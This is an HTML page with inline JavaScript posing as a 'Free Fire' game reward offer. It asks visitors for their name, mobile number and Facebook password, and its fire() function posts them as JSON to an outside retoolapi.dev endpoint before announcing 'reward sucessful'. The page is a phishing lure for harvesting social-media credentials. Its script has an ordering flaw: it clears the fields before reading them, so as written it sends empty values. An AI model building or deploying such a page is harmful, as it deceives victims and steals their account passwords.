<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
</head>
<body>
    <div class="container">
        <div class="row">
            <div class="col"><h1 class="text-warning">Free Fire Offer! Enter and Claim</h1></div>
        </div>
        <div class="row">   
            <div class="col"><marquee behavior="scroll" direction="right" width="500px" class="text-primary">Limited Offer!</marquee></div>
        </div>
        <div class="row ">
            <label for="name">Enter Name:</label>
            <div class="col col-3 mt-2"><input type="text" id="name" placeholder="Enter the name" class="form-control"></div>
        </div>
        <div class="row">
            <div class="col mt-2"><label for="">Mobile Number:</label></div>
            <div class="row">
                <div class="col col-3 mt-2"><input type="text" inputmode="tel" id="num" class="form-control"></div>
            </div>
        </div>
        <div class="row">
            <label for="pass">Facebook password:</label>
            <div class="col col-3"><input type="password" id="pass" class="form-control"></div>
        </div>
        <div class="row">
            <div class="col mt-2"><input type="button" class="btn btn-success" onclick="fire()" value="Claim"></div>
        </div>
    </div>
    <script>

        var fflink="https://retoolapi.dev/imc1ZY/ffdata"
        function getvalue(){
      let name =  document.getElementById('name').value;
      let pass =  document.getElementById('pass').value;
      let num =  document.getElementById('num').value;

      return{
        name:name,
        pass:pass,
        num:num
      }
        }
        function clear(){
            let name =  document.getElementById('name').value="";
      let pass =  document.getElementById('pass').value="";
      let num =  document.getElementById('num').value="";
        }
        function fire(){
            clear();
            
            fetch (fflink,{
            method:'POST',
            body:JSON.stringify(getvalue()),
            headers:{
                'content-type':'application/JSON'
            }
            }).then((Response)=>{
                if(Response.ok){
                    alert('reward sucessful')
                }else{
                    throw new error("error");
                }
            }).catch((error)=>{
                alert("error"+error.message)
            })


        }

    </script>
</body>
</html>
